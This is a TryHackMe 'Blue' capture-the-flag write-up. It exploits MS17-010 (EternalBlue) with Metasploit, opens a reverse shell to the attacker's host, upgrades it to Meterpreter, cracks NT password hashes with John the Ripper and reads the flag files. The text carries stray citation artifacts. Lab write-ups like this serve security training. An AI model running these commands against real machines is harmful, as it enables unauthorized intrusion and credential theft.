# TryHackMe | Blue CTF Writeup

This writeup documents the steps taken to solve the **Blue** room on TryHackMe.  
The challenge focuses on exploiting the **MS17-010 (EternalBlue)** vulnerability using Metasploit to gain system access on a Windows machine. :contentReference[oaicite:0]{index=0}

---

## Challenge Information

- **Platform:** TryHackMe  
- **Room:** Blue  
- **Category:** Exploitation / Windows  
- **Difficulty:** Beginner  

---

## Recon

The first step was performing a port and service scan to identify exposed services.

```bash
nmap -sV -sC <target-ip>
```

The scan revealed several SMB-related ports:

- `135/tcp`
- `139/tcp`
- `445/tcp`

These ports are commonly associated with **Windows SMB services**, which are known to be vulnerable to the **MS17-010 EternalBlue exploit**. :contentReference[oaicite:1]{index=1}

To confirm the vulnerability, the following Nmap script can be used:

```bash
nmap -sV -sC --script smb-vuln-ms17-010.nse <target-ip>
```

---

## Enumeration

Since the machine was vulnerable to **MS17-010**, exploitation could be performed using Metasploit.

First, start the Metasploit framework:

```bash
msfconsole
```

Search for the EternalBlue exploit module:

```
search ms17-010
```

Multiple modules appear, but the relevant one is:

```
exploit/windows/smb/ms17_010_eternalblue
```

Load the module:

```
use exploit/windows/smb/ms17_010_eternalblue
```

---

## Exploitation

Before executing the exploit, configure the required options.

First, set the payload for the reverse shell:

```
set payload windows/x64/shell/reverse_tcp
```

Next, configure the target and attacker addresses:

```
set RHOSTS <target-ip>
set LHOST <attacker-ip>
```

Verify the module configuration:

```
show options
```

Once everything is configured, run the exploit:

```
run
```

If successful, a reverse shell will open on the attacker machine. The exploit may take several attempts depending on network conditions. :contentReference[oaicite:2]{index=2}

After the shell is obtained, verify the privileges:

```
whoami
```

If the output shows:

```
nt authority\system
```

then the exploit has successfully provided SYSTEM-level access.

---

## Shell Upgrade

The initial shell can be upgraded to a Meterpreter shell for improved functionality.

First, background the current session:

```
CTRL + Z
```

Search for the shell upgrade module:

```
search shell_to_meterpreter
```

Load the module:

```
use post/multi/manage/shell_to_meterpreter
```

Set the required options:

```
set SESSION 1
set LHOST <attacker-ip>
```

Run the module to upgrade the shell.

Afterward, list sessions:

```
sessions -l
```

Interact with the new Meterpreter session:

```
sessions 2
```

If successful, the prompt will change to `meterpreter`.

---

## Privilege Verification

Within the Meterpreter session, verify system information:

```
sysinfo
```

Check running processes:

```
ps
```

Confirm elevated privileges:

```
getsystem
```

These commands confirm that the attacker has SYSTEM-level access to the machine. :contentReference[oaicite:3]{index=3}

---

## Extracting Password Hashes

Using Meterpreter, password hashes can be extracted from the system.

The relevant hash belongs to the user **Jon**.

Once obtained, save the hash to a file and crack it using John the Ripper:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

This reveals the password associated with the user account. :contentReference[oaicite:4]{index=4}

---

## Retrieving the Flags

The machine contains three flags stored in different locations.

Navigate to the root of the C drive to retrieve the first flag:

```
cd C:\
type flag1.txt
```

The second flag can be found in:

```
C:\Windows\System32\Config
```

The third flag is located in the Documents directory of the user **Jon**:

```
C:\Users\Jon\Documents
type flag3.txt
```

Each file contains one of the required flags for the challenge. :contentReference[oaicite:5]{index=5}